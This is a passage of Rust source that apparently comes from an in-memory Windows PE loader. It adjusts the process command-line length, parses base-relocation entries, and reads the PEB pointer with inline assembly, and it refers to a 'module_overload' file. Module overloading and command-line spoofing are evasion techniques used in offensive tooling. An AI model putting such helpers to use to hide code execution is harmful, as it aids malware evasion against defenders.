                (*process_parameters).CommandLine.Length = (path_name.len() * 2) as u16;
            }
        }
        Ok(())
    }
}

// ── Relocation entry helper ───────────────────────────────────────────────────

pub struct BaseRelocationEntry {
    pub data: u16,
}
impl BaseRelocationEntry {
    pub fn offset(&self) -> u16 { self.data & 0x0FFF }
    pub fn type_(&self) -> u16 { (self.data >> 12) & 0xF }
}

// ── PEB access (same as module_overload.rs) ───────────────────────────────────

#[inline(always)]
pub fn NtCurrentPeb() -> *mut PEB {
    unsafe {
        #[cfg(target_arch = "x86_64")]
        {
            let peb: *mut PEB;
            std::arch::asm!(
                "mov {}, gs:[0x60]",
                out(reg) peb
            );
            peb
        }
        #[cfg(target_arch = "x86")]
        {
            let peb: *mut PEB;
            std::arch::asm!(
                "mov {}, fs:[0x30]",
                out(reg) peb
            );
            peb
        }
    }
}

```